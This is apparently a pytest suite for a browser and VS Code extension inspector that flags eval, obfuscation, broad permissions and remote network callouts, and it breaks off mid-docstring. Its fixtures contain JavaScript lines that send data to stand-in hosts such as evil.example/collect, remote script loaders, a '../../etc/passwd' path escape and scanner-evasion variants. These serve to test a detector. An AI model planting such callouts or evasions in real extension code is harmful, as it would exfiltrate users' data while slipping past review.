import json
from hashlib import sha256

import pytest

from app.inspector import InspectorError, PackageAnalysis, _strip_json_comments, inspect_package
from tests.conftest import make_zip


def test_basic_manifest_permissions():
    data = make_zip(
        {
            "manifest.json": json.dumps(
                {
                    "manifest_version": 3,
                    "name": "Test",
                    "version": "1.0",
                    "permissions": ["storage", "tabs"],
                    "host_permissions": ["<all_urls>"],
                }
            ),
            "background.js": "console.log('ok');",
        }
    )
    result = inspect_package(data)
    assert "storage" in result.permissions
    assert "tabs" in result.permissions
    assert "<all_urls>" in result.host_permissions
    assert result.manifest_version == 3


def test_eval_detection():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
            "content.js": "eval('alert(1)'); doSomething();",
        }
    )
    result = inspect_package(data)
    assert result.uses_eval is True


def test_new_function_detection():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
            "bg.js": "var f = new Function('return 1');",
        }
    )
    result = inspect_package(data)
    assert result.uses_eval is True


def test_remote_code_detection():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
            "bg.js": "fetch('https://evil.example.com/data').then(r => r.json());",
        }
    )
    result = inspect_package(data)
    assert result.uses_remote_code is True
    assert result.network_callout_urls == ["https://evil.example.com/data"]


def test_external_domain_extracted():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
            "bg.js": "var url = 'https://tracker.badactor.io/collect';",
        }
    )
    result = inspect_package(data)
    assert any("badactor.io" in d for d in result.external_domains)
    assert "https://tracker.badactor.io/collect" in result.external_urls


def test_package_sha256_is_recorded():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "bg.js": "console.log('ok');",
        }
    )
    result = inspect_package(data)
    assert result.package_sha256 == sha256(data).hexdigest()
    assert result.archive_sha256 == sha256(data).hexdigest()


def test_safe_domains_not_flagged():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
            "bg.js": "fetch('https://fonts.googleapis.com/css?family=Roboto');",
        }
    )
    result = inspect_package(data)
    assert result.external_domains == []
    assert result.external_urls == []
    assert result.network_callout_urls == []


def test_no_eval_clean_code():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
            "bg.js": "function greet(name) { return 'Hello ' + name; }",
        }
    )
    result = inspect_package(data)
    assert result.uses_eval is False
    assert result.uses_remote_code is False


def test_file_count():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
            "bg.js": "",
            "content.js": "",
            "popup.html": "",
        }
    )
    result = inspect_package(data)
    assert result.file_count == 4


def test_invalid_zip_raises():
    with pytest.raises(InspectorError):
        inspect_package(b"not a zip file at all")


def test_crx_header_stripped():
    """Simulate a CRX with a fake header before the zip magic."""
    zip_bytes = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "T", "version": "1"}),
        }
    )
    # Prepend fake CRX3 header bytes
    fake_header = b"Cr24" + b"\x00" * 12
    crx_data = fake_header + zip_bytes
    result = inspect_package(crx_data)
    assert result.manifest_version == 3
    assert result.package_sha256 == sha256(crx_data).hexdigest()
    assert result.archive_sha256 == sha256(zip_bytes).hexdigest()


def test_vscode_package_json():
    data = make_zip(
        {
            "extension/package.json": json.dumps(
                {
                    "name": "my-ext",
                    "version": "0.5.0",
                    "contributes": {"commands": []},
                }
            ),
            "extension/background.js": "console.log('vscode');",
        }
    )
    result = inspect_package(data)
    # VS Code extensions don't have Chrome-style permissions
    assert result.permissions == []
    assert "manifest_v2" not in _finding_codes(result)


def _finding_codes(result):
    return {f.code for f in result.findings}


def test_finding_shape_includes_context():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "nested/background.js": "\n\nconst result = eval('2 + 2');",
        }
    )
    result = inspect_package(data)
    finding = next(f for f in result.findings if f.code == "eval_usage")
    assert finding.severity == "high"
    assert finding.source == "javascript"
    assert finding.file == "nested/background.js"
    assert finding.line == 3
    assert finding.title
    assert finding.detail


@pytest.mark.parametrize(
    ("source", "expected_code"),
    [
        ("eval('alert(1)')", "eval_usage"),
        ("const f = new Function('return 1');", "new_function_usage"),
        ("setTimeout('alert(1)', 10);", "string_timer_execution"),
        (
            "const s = document.createElement('script'); s.src = 'https://evil.example/app.js';",
            "dynamic_script_injection",
        ),
        ("importScripts('https://evil.example/sw.js');", "remote_import_scripts"),
        ("fetch('https://evil.example/data');", "remote_fetch"),
        ("const x = new XMLHttpRequest(); x.open('GET', 'https://evil.example/data');", "remote_xhr"),
        ("const ws = new WebSocket('wss://evil.example/socket');", "remote_websocket"),
        ("const events = new EventSource('https://evil.example/events');", "remote_eventsource"),
        ("navigator.sendBeacon('https://evil.example/beacon', '{}');", "remote_send_beacon"),
    ],
)
def test_javascript_detector_findings(source, expected_code):
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "background.js": source,
        }
    )
    result = inspect_package(data)
    assert expected_code in _finding_codes(result)


def test_bare_xhr_constructor_is_not_remote_code():
    # A bare `new XMLHttpRequest` says nothing about the destination; an extension
    # loading its own bundled resource must not score as remote code (#151) — and must
    # behave like the equivalent fetch(), which already scored 0.
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "bg.js": "const x = new XMLHttpRequest(); x.open('GET', 'data/config.json'); x.send();",
        }
    )
    result = inspect_package(data)
    assert result.uses_remote_code is False
    assert "remote_xhr" not in _finding_codes(result)


def test_local_and_remote_fetch_parity():
    # fetch() and XHR now agree: a local (bundled) resource scores 0, a remote one flags.
    def check(source):
        return inspect_package(
            make_zip(
                {
                    "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
                    "bg.js": source,
                }
            )
        )

    assert check("fetch('data/config.json');").uses_remote_code is False
    assert check("fetch('https://evil.example/x');").uses_remote_code is True
    assert check("var x = new XMLHttpRequest(); x.open('GET', 'https://evil.example/x');").uses_remote_code is True


def _csp_manifest(csp: str) -> bytes:
    return make_zip(
        {
            "manifest.json": json.dumps(
                {"manifest_version": 2, "name": "x", "version": "1", "content_security_policy": csp}
            ),
        }
    )


def test_scoped_wildcard_subdomain_csp_not_flagged_broad():
    # https://*.googleapis.com is a scoped subdomain wildcard — a legitimate, common
    # historical MV2 pattern — and must NOT be flagged as a broad wildcard source (#151).
    result = inspect_package(_csp_manifest("script-src 'self' https://*.googleapis.com"))
    assert "csp_wildcard_script_source" not in _finding_codes(result)


@pytest.mark.parametrize(
    "csp",
    [
        "script-src *",  # bare wildcard
        "script-src 'self' https://*",  # whole-host wildcard
        "script-src 'self' https://*:443",  # whole-host wildcard with port
        "script-src 'self' https://*/scripts",  # whole-host wildcard with path
    ],
)
def test_whole_host_wildcard_csp_flagged_broad(csp):
    result = inspect_package(_csp_manifest(csp))
    assert "csp_wildcard_script_source" in _finding_codes(result)


def test_manifest_risk_findings():
    data = make_zip(
        {
            "manifest.json": json.dumps(
                {
                    "manifest_version": 2,
                    "name": "x",
                    "version": "1",
                    "permissions": ["debugger", "tabs"],
                    "host_permissions": ["<all_urls>"],
                    "content_security_policy": "script-src 'self' 'unsafe-eval' http://bad.example *; object-src 'self'",
                }
            ),
        }
    )
    result = inspect_package(data)
    codes = _finding_codes(result)
    assert "manifest_v2" in codes
    assert "broad_host_access" in codes
    assert "high_risk_permission" in codes
    assert "csp_unsafe_eval" in codes
    assert "csp_insecure_remote_source" in codes
    assert "csp_wildcard_script_source" in codes


def test_mv2_wildcard_host_pattern_merged_and_flagged():
    # MV2 spells all-sites access as "*://*/*" inside `permissions`; it must be
    # merged into host_permissions and produce the broad-host finding (#141).
    data = make_zip(
        {
            "manifest.json": json.dumps(
                {
                    "manifest_version": 2,
                    "name": "x",
                    "version": "1",
                    "permissions": ["*://*/*", "storage"],
                }
            ),
        }
    )
    result = inspect_package(data)
    assert result.host_permissions == ["*://*/*"]
    assert result.permissions == ["storage"]
    assert "broad_host_access" in _finding_codes(result)


def test_mv2_file_scheme_host_pattern_merged():
    data = make_zip(
        {
            "manifest.json": json.dumps(
                {
                    "manifest_version": 2,
                    "name": "x",
                    "version": "1",
                    "permissions": ["file:///*", "storage"],
                }
            ),
        }
    )
    result = inspect_package(data)
    assert result.host_permissions == ["file:///*"]
    assert result.permissions == ["storage"]


def test_named_api_permissions_not_mistaken_for_host_patterns():
    # fileSystemProvider/fileSystem are real API permissions that share a word
    # prefix with the file:// scheme — the MV2 merge must match full scheme
    # prefixes only, or they'd be misclassified as host permissions (#141 review).
    data = make_zip(
        {
            "manifest.json": json.dumps(
                {
                    "manifest_version": 2,
                    "name": "x",
                    "version": "1",
                    "permissions": ["fileSystemProvider", "fileSystem", "file:///*"],
                }
            ),
        }
    )
    result = inspect_package(data)
    assert result.permissions == ["fileSystemProvider", "fileSystem"]
    assert result.host_permissions == ["file:///*"]


def test_minified_and_obfuscated_findings():
    compressed = " ".join(["a"] * 600)
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "packed.js": compressed,
        }
    )
    result = inspect_package(data)
    codes = _finding_codes(result)
    assert "minified_javascript" in codes
    assert "obfuscated_javascript" in codes


def test_obfuscation_score_single_char_tier():
    # Regression (#74): a body dominated by single-char identifiers must score the
    # top +4 tier. Previously the single-char branch was unreachable (short >= single
    # meant the <=2-char branch always won first).
    from app.inspector import _obfuscation_score

    letters = list("abcdefghijklmnopqrstuvwxyz")
    # ~156 identifiers, all single-character (separated so tokens can't merge).
    source = "; ".join(f"{c}={c}" for c in letters * 3)
    assert _obfuscation_score(source) >= 4


def test_obfuscation_score_two_char_tier():
    # Regression (#74): a body dominated by 2-char (not single-char) identifiers
    # scores the +3 tier, not the +4 single-char tier.
    from app.inspector import _obfuscation_score

    pairs = [f"{a}{b}" for a in "abcdefgh" for b in "ijklmnop"]  # 64 distinct 2-char names
    source = "; ".join(f"{name}={name}" for name in pairs)
    score = _obfuscation_score(source)
    assert score == 3


def test_oversized_manifest_raises_rather_than_reporting_no_permissions():
    """Changed by #274: this used to return an analysis with `permissions == []`
    and the JS findings.

    That analysis is truthy, so services._effective_values preferred its empty
    permission list over the stored one — silently zeroing a real extension's
    permissions and firing a spurious `permission_change` removal alert. An
    over-limit manifest is the same situation as an unparsable one: the package
    declares permissions we did not read, so we must not claim it has none.
    Raising routes it through the keep-stale path, and scoring falls back to the
    unknown-midpoint rather than a falsely clean zero.
    """
    data = make_zip(
        {
            "manifest.json": b"{" + (b" " * (1024 * 1024 + 1)) + b"}",
            "background.js": "eval('alert(1)');",
        }
    )
    with pytest.raises(InspectorError, match="unparsable"):
        inspect_package(data)


def test_findings_are_capped():
    files = {
        "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
    }
    for idx in range(250):
        files[f"file{idx}.js"] = "eval('alert(1)');"
    result = inspect_package(make_zip(files))
    assert len(result.findings) == 200


def test_identical_findings_are_deduped():
    # A manifest can list the same broad host permission twice; both produce a
    # finding with an identical identity tuple, which must collapse to one (#64).
    data = make_zip(
        {
            "manifest.json": json.dumps(
                {
                    "manifest_version": 3,
                    "name": "x",
                    "version": "1",
                    "host_permissions": ["<all_urls>", "<all_urls>"],
                }
            )
        }
    )
    result = inspect_package(data)
    broad = [f for f in result.findings if f.code == "broad_host_access"]
    assert len(broad) == 1


def test_external_domains_are_capped():
    urls = "\n".join(f"https://tracker{i}.example/path" for i in range(600))
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "background.js": urls,
        }
    )
    result = inspect_package(data)
    assert len(result.external_domains) == 500


def test_external_urls_are_capped_and_deduped():
    urls = "\n".join(f"https://tracker{i}.example/path" for i in range(600))
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "background.js": urls + "\nhttps://tracker1.example/path",
        }
    )
    result = inspect_package(data)
    assert len(result.external_urls) == 500
    assert result.external_urls.count("https://tracker1.example/path") == 1


def test_external_urls_ignore_non_domain_hosts_and_strip_trailing_punctuation():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "background.js": "const local = 'https://interceptor'; const remote = 'https://evil.example/path)';",
        }
    )
    result = inspect_package(data)
    assert "interceptor" not in result.external_domains
    assert "https://interceptor" not in result.external_urls
    assert "evil.example" in result.external_domains
    assert "https://evil.example/path" in result.external_urls


def test_network_callout_urls_are_split_from_literal_references():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "background.js": "\n".join(
                [
                    "const docs = 'http://www.w3.org/1998/Math/MathML';",
                    "fetch('https://api.example/data');",
                    "const xhr = new XMLHttpRequest(); xhr.open('POST', 'https://xhr.example/collect');",
                    "const ws = new WebSocket('wss://socket.example/ws');",
                    "navigator.sendBeacon('https://beacon.example/ping', '{}');",
                ]
            ),
        }
    )
    result = inspect_package(data)
    assert "http://www.w3.org/1998/Math/MathML" in result.external_urls
    assert "https://api.example/data" in result.network_callout_urls
    assert "https://xhr.example/collect" in result.network_callout_urls
    assert "wss://socket.example/ws" in result.network_callout_urls
    assert "https://beacon.example/ping" in result.network_callout_urls
    assert "http://www.w3.org/1998/Math/MathML" not in result.network_callout_urls


# ---------------------------------------------------------------------------
# PackageAnalysis serialization / render-default contract (#164)
# ---------------------------------------------------------------------------


def test_to_json_dict_round_trips_a_real_analysis():
    """to_json_dict is what gets persisted; it must survive json + carry the
    stored fields, with findings flattened to plain dicts."""
    data = make_zip(
        {
            "manifest.json": json.dumps(
                {
                    "manifest_version": 3,
                    "name": "Test",
                    "version": "2.1",
                    "permissions": ["storage", "tabs"],
                    "host_permissions": ["<all_urls>"],
                }
            ),
            "background.js": "eval('x');",
        }
    )
    analysis = inspect_package(data)

    stored = json.loads(json.dumps(analysis.to_json_dict()))
    assert stored["permissions"] == analysis.permissions
    assert stored["host_permissions"] == analysis.host_permissions
    assert stored["uses_eval"] is True
    # findings are dicts, not PackageFinding objects
    assert stored["findings"] and all(isinstance(f, dict) for f in stored["findings"])
    assert stored["findings"][0]["code"] == analysis.findings[0].code


def test_to_json_dict_excludes_internal_and_transient_fields():
    """_finding_keys is bookkeeping; version/author are manifest fallbacks
    consumed in services.py and deliberately never persisted."""
    analysis = PackageAnalysis(version="9.9", author="Somebody")
    stored = analysis.to_json_dict()
    assert "_finding_keys" not in stored
    assert "version" not in stored
    assert "author" not in stored


def test_stored_defaults_and_to_json_dict_share_the_same_keys():
    """The drift gate the issue calls out: serialization (to_json_dict) and the
    render-time default backfill (stored_defaults) must enumerate exactly the
    same field set, so adding a stored field to the dataclass can never land in
    one without the other (#164)."""
    persisted_keys = set(PackageAnalysis().to_json_dict())
    default_keys = set(PackageAnalysis.stored_defaults())
    assert persisted_keys == default_keys


def test_stored_defaults_returns_fresh_mutable_defaults():
    """Callers mutate the returned dict (setdefault into a stored blob), so the
    list/dict defaults must not be shared across calls."""
    first = PackageAnalysis.stored_defaults()
    first["findings"].append({"code": "x"})
    first["external_domains"].append("evil.example")
    second = PackageAnalysis.stored_defaults()
    assert second["findings"] == []
    assert second["external_domains"] == []


def test_stored_defaults_backfills_a_sparse_stored_blob():
    """Mirrors routes/ui.py: an old/partial blob missing keys is completed
    without clobbering the keys it does carry."""
    sparse = {"host_permissions": ["<all_urls>"], "findings": [{"code": "y"}]}
    for key, default in PackageAnalysis.stored_defaults().items():
        sparse.setdefault(key, default)

    assert sparse["host_permissions"] == ["<all_urls>"]  # preserved
    assert sparse["findings"] == [{"code": "y"}]  # preserved
    assert sparse["uses_eval"] is False  # backfilled
    assert sparse["manifest_version"] == 2  # backfilled
    assert sparse["package_sha256"] == ""  # backfilled


# --- #275: the code-behaviour scan must not be evadable by filename ------------


def test_mjs_payload_is_scanned():
    """The issue's headline case: a payload named `bg.mjs` used to score zero on
    every code-behaviour and network signal — below an extension whose package
    could not be downloaded at all, which gets the unknown-midpoint."""
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "bg.mjs": "eval(atob('x')); fetch('https://evil.example/collect');",
        }
    )
    result = inspect_package(data)
    assert result.uses_eval is True
    assert result.uses_remote_code is True
    assert "evil.example" in result.external_domains


def test_cjs_payload_is_scanned():
    """A VS Code extension's `main` is routinely `extension.cjs`."""
    data = make_zip(
        {
            "extension/package.json": json.dumps(
                {"name": "e", "version": "1", "contributes": {}, "main": "./out/extension.cjs"}
            ),
            "extension/out/extension.cjs": "eval('1');",
        }
    )
    assert inspect_package(data).uses_eval is True


def test_manifest_referenced_file_is_scanned_whatever_its_extension():
    """Chrome loads whatever path the manifest names, so the manifest — not the
    filename — is the authoritative list of what executes."""
    data = make_zip(
        {
            "manifest.json": json.dumps(
                {
                    "manifest_version": 3,
                    "name": "x",
                    "version": "1",
                    "background": {"service_worker": "core.dat"},
                }
            ),
            "core.dat": "eval('payload'); fetch('https://evil.example/x');",
        }
    )
    result = inspect_package(data)
    assert result.uses_eval is True
    assert "evil.example" in result.external_domains


def test_manifest_referenced_content_script_is_scanned():
    data = make_zip(
        {
            "manifest.json": json.dumps(
                {
                    "manifest_version": 3,
                    "name": "x",
                    "version": "1",
                    "content_scripts": [{"matches": ["<all_urls>"], "js": ["/payload.bin"]}],
                }
            ),
            "payload.bin": "new Function('x')();",
        }
    )
    assert "new_function_usage" in _finding_codes(inspect_package(data))


def test_manifest_path_cannot_escape_the_archive():
    """A `..` segment is dropped rather than resolved — a manifest must not
    reach outside its own package."""
    data = make_zip(
        {
            "manifest.json": json.dumps(
                {
                    "manifest_version": 3,
                    "name": "x",
                    "version": "1",
                    "background": {"service_worker": "../../etc/passwd"},
                }
            ),
            "ok.js": "console.log(1);",
        }
    )
    assert inspect_package(data).uses_eval is False  # no crash, nothing escaped


def test_inline_script_in_background_page_is_scanned():
    """An MV2 background page can carry its whole payload inline."""
    data = make_zip(
        {
            "manifest.json": json.dumps(
                {"manifest_version": 2, "name": "x", "version": "1", "background": {"page": "bg.html"}}
            ),
            "bg.html": "<html><body><script>eval('go'); fetch('https://evil.example/c');</script></body></html>",
        }
    )
    result = inspect_package(data)
    assert result.uses_eval is True
    assert result.uses_remote_code is True
    assert "evil.example" in result.external_domains


def test_remote_script_include_in_packaged_page_is_flagged():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
            "popup.html": '<html><script src="https://evil.example/loader.js"></script></html>',
        }
    )
    result = inspect_package(data)
    assert result.uses_remote_code is True
    assert "remote_script_include" in _finding_codes(result)
    assert "evil.example" in result.external_domains


def test_html_findings_report_the_line_in_the_page():
    """Masking (rather than stripping) the markup keeps reported line numbers
    pointing at real positions in the HTML file."""
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
            "page.html": "<html>\n<body>\n<div>hi</div>\n<script>\neval('x');\n</script>\n</body>\n</html>",
        }
    )
    finding = next(f for f in inspect_package(data).findings if f.code == "eval_usage")
    assert finding.file == "page.html"
    assert finding.line == 5


def test_markup_only_html_does_not_trigger_js_heuristics():
    """Guards the #151 false-positive class: a large minified page with no
    inline script must not read as minified/obfuscated JavaScript."""
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "big.html": "<html><body>" + "<div class='a b c'>text</div>" * 400 + "</body></html>",
        }
    )
    result = inspect_package(data)
    assert result.has_minified_code is False
    assert result.obfuscation_score == 0
    assert _finding_codes(result) == set()


@pytest.mark.parametrize(
    "page",
    [
        # An HTML parser ends a script block on any of these; matching only the
        # clean `</script>` spelling let the payload hide behind a sloppy end tag.
        "<html><script>eval('x');</script foo></html>",
        "<html><script>eval('x');</script\n></html>",
        "<html><script>eval('x');</script/></html>",
        # Unterminated at EOF — browsers execute it all the same.
        "<html><body><script>eval('x');",
    ],
)
def test_script_block_end_tag_variants_do_not_hide_the_payload(page):
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
            "bg.html": page,
        }
    )
    assert inspect_package(data).uses_eval is True


def test_script_inside_an_html_comment_is_not_treated_as_code():
    """A commented-out script never executes, so flagging it would be a pure
    false positive. A regex over the raw page could not tell the difference."""
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "c.html": "<html><!--<script>eval('x');fetch('https://evil.example/a');</script>--></html>",
        }
    )
    result = inspect_package(data)
    assert result.uses_eval is False
    assert result.external_domains == []


def test_script_ends_at_a_close_tag_inside_a_string_literal():
    """Browsers end the block at the first `</script>` even inside a string, so
    the trailing eval is markup, not code — matching browser semantics is the
    point of parsing rather than pattern-matching."""
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "s.html": "<html><script>var s='</script>';eval('x');</script></html>",
        }
    )
    assert inspect_package(data).uses_eval is False


def test_markup_after_a_sloppy_end_tag_is_still_masked():
    """The end-tag handling must not swing the other way and start feeding
    markup to the JS heuristics."""
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "p.html": "<html><script>var a=1;</script foo>" + "<div class='a b c'>t</div>" * 400 + "</html>",
        }
    )
    result = inspect_package(data)
    assert result.has_minified_code is False
    assert result.obfuscation_score == 0


# --- #275 review: HTML script elements must be classified the way a browser does ---


@pytest.mark.parametrize(
    "src",
    [
        " https://evil.example/p.js",  # browsers strip leading ASCII whitespace
        "https://evil.example/p.js ",
        "\thttps://evil.example/p.js",
        "\nhttps://evil.example/p.js\n",
    ],
)
def test_remote_script_src_is_normalised_before_the_scheme_check(src):
    """A raw-attribute comparison let `src=" https://…"` load remote code while
    producing no finding, no external domain and no callout at all."""
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "p.html": f'<html><script src="{src}"></script></html>',
        }
    )
    result = inspect_package(data)
    assert result.uses_remote_code is True
    assert "remote_script_include" in _finding_codes(result)
    assert "evil.example" in result.external_domains


@pytest.mark.parametrize(
    "script_type",
    ["application/json", "importmap", "speculationrules", "text/x-handlebars-template"],
)
def test_data_blocks_are_not_scanned_as_javascript(script_type):
    """A non-JavaScript type is a data block: the body never executes, so scoring
    it would let inert JSON containing the text `eval(...)` add code-behaviour
    points."""
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "p.html": f'<html><script type="{script_type}">{{"x":"eval(payload); fetch(\'https://evil.example/a\')"}}</script></html>',
        }
    )
    result = inspect_package(data)
    assert result.uses_eval is False
    assert result.uses_remote_code is False
    assert result.external_domains == []
    assert _finding_codes(result) == set()


def test_src_on_a_data_block_is_not_flagged():
    """Browsers never fetch the src of a non-executable script type, so a critical
    finding there is a pure false positive."""
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "p.html": '<html><script type="application/json" src="https://cdn.example/data.json"></script></html>',
        }
    )
    result = inspect_package(data)
    assert result.uses_remote_code is False
    assert "remote_script_include" not in _finding_codes(result)


@pytest.mark.parametrize(
    "script_type",
    [
        "",  # <script type="">
        "text/javascript",
        "TEXT/JAVASCRIPT",  # matching is case-insensitive
        "text/javascript; charset=utf-8",  # parameters ignored: match on the essence
        "module",
        "application/ecmascript",
        "text/jscript",  # legacy spellings are still executed
    ],
)
def test_executable_script_types_are_still_scanned(script_type):
    """The type check must not swing the other way and let a payload hide behind
    a legacy or parameterised JavaScript MIME type."""
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "p.html": f'<html><script type="{script_type}">eval("x");</script></html>',
        }
    )
    assert inspect_package(data).uses_eval is True


def test_duplicate_type_attribute_uses_the_browsers_first_value():
    """HTML keeps the FIRST of a repeated attribute; BeautifulSoup defaults to the
    last. `type="text/javascript" type="application/json"` executes in a browser,
    so reading the trailing type would skip a live payload."""
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "p.html": '<html><script type="text/javascript" type="application/json">eval("x");</script></html>',
        }
    )
    assert inspect_package(data).uses_eval is True


def test_duplicate_src_attribute_uses_the_browsers_first_value():
    """Same rule for src: the browser loads the first, so that is the URL to report."""
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "p.html": '<html><script src="https://evil.example/a.js" src="local.js"></script></html>',
        }
    )
    result = inspect_package(data)
    assert result.uses_remote_code is True
    assert "evil.example" in result.external_domains


def test_duplicate_type_does_not_create_a_false_positive_either():
    """The inverse: a data block whose *first* type is inert stays inert."""
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "p.html": '<html><script type="application/json" type="text/javascript">eval("x");</script></html>',
        }
    )
    assert inspect_package(data).uses_eval is False


# --- #274: a tolerated manifest must parse, and an unparsable one must not ------
#     silently pass off an empty analysis as a real one


def test_manifest_with_utf8_bom_is_parsed():
    """Chrome tolerates a BOM, so BOM'd manifests are live in the stores;
    `json.loads` on a utf-8-decoded string rejects them outright."""
    manifest = json.dumps({"manifest_version": 3, "name": "x", "version": "1", "permissions": ["tabs"]})
    data = make_zip({"manifest.json": "﻿" + manifest})
    assert inspect_package(data).permissions == ["tabs"]


def test_manifest_with_comments_is_parsed():
    """Chrome also tolerates JS-style comments in manifest.json."""
    raw = """{
  // leading line comment
  "manifest_version": 3,
  /* block
     comment */
  "name": "x",
  "version": "1",
  "permissions": ["tabs", "storage"]  // trailing comment
}"""
    result = inspect_package(make_zip({"manifest.json": raw}))
    assert result.permissions == ["tabs", "storage"]


def test_comment_stripping_does_not_cut_urls_inside_strings():
    """A naive strip would cut `"https://example.com"` at the `//`, turning a
    valid manifest into the very parse error this exists to avoid."""
    raw = '{"manifest_version": 3, "name": "x", "version": "1", "homepage_url": "https://example.com/a", "permissions": ["tabs"]}'
    result = inspect_package(make_zip({"manifest.json": raw}))
    assert result.permissions == ["tabs"]


def test_comment_stripping_preserves_escaped_quotes():
    raw = r'{"manifest_version": 3, "name": "a \" b // not a comment", "version": "1", "permissions": ["tabs"]}'
    result = inspect_package(make_zip({"manifest.json": raw}))
    assert result.permissions == ["tabs"]


@pytest.mark.parametrize(
    "body",
    [
        "{ this is not json at all",
        '["a", "list", "not", "an", "object"]',  # valid JSON, wrong shape
        '"just a string"',
    ],
)
def test_unparsable_manifest_raises_rather_than_zeroing_permissions(body):
    """The whole point of #274: an analysis with permissions==[] is still truthy,
    so services._effective_values would prefer it over the stored values and
    overwrite a real extension's permissions with nothing."""
    data = make_zip({"manifest.json": body, "bg.js": "console.log(1);"})
    with pytest.raises(InspectorError):
        inspect_package(data)


def test_package_with_no_manifest_at_all_still_analyses():
    """Absent is not the same as unparsable — nothing stored can be clobbered by
    a manifest that was never claimed."""
    result = inspect_package(make_zip({"bg.js": "eval('x');"}))
    assert result.uses_eval is True
    assert result.permissions == []


@pytest.mark.parametrize(
    "package_json",
    [
        {"name": "e", "version": "1", "extensionPack": ["ms.python"]},  # extension pack
        {"name": "e", "version": "1", "main": "./out/ext.js", "activationEvents": ["*"]},  # API-only
        {"name": "e", "version": "1", "contributes": {}},  # the case that already worked
    ],
)
def test_vscode_package_without_contributes_is_not_flagged_manifest_v2(package_json):
    """`"contributes" in manifest` missed extension packs and API-only extensions;
    they fell through to the Chrome path, where manifest_version defaulted to 2
    and produced a Chrome-specific MV2 finding on a VSIX, worth +2 on the score."""
    data = make_zip({"extension/package.json": json.dumps(package_json), "extension/out/ext.js": "x=1;"})
    result = inspect_package(data)
    assert "manifest_v2" not in _finding_codes(result)
    assert result.permissions == []


def test_vscode_package_identified_by_engines_despite_a_chrome_manifest_filename():
    """`engines.vscode` is the second signal, for a package whose manifest sits at
    a Chrome-looking path but is really a VS Code one — there the filename check
    says "Chrome" and only the body can correct it.

    (Deliberately a root `manifest.json`: that is what `_load_manifest` actually
    matches. An `extension/manifest.json` is not a candidate at all, so a test
    using one would pass vacuously — no manifest loaded, hence no finding.)
    """
    data = make_zip(
        {
            "manifest.json": json.dumps(
                {"name": "e", "version": "1", "engines": {"vscode": "^1.80.0"}, "main": "./ext.js"}
            ),
            "ext.js": "x=1;",
        }
    )
    result = inspect_package(data)
    assert "manifest_v2" not in _finding_codes(result)
    assert result.permissions == []


def test_a_real_chrome_mv2_extension_is_still_flagged():
    """The classifier must not swing the other way and stop flagging real MV2."""
    data = make_zip({"manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"})})
    assert "manifest_v2" in _finding_codes(inspect_package(data))


@pytest.mark.parametrize(
    "manifest",
    [
        {"manifest_version": 3, "name": "x", "version": "1"},
        # Strings that look like comments — the stripper must not touch any of them.
        {"manifest_version": 3, "homepage_url": "https://example.com/a//b", "name": "x", "version": "1"},
        {"manifest_version": 3, "content_scripts": [{"matches": ["*://*/*", "https://*/*"]}], "version": "1"},
        {"manifest_version": 3, "description": "uses /* glob */ syntax", "version": "1"},
        {"manifest_version": 3, "description": 'quote " then // not a comment', "version": "1"},
        {"manifest_version": 3, "description": "backslash \\ at end", "version": "1"},
        {"manifest_version": 3, "csp": "script-src 'self' https://cdn.example.com//x", "version": "1"},
    ],
)
def test_comment_stripping_round_trips_valid_json(manifest):
    """Property check: stripping comments from JSON that has none must be a no-op
    on the parsed value. The stripper only runs as a fallback, but a bug here
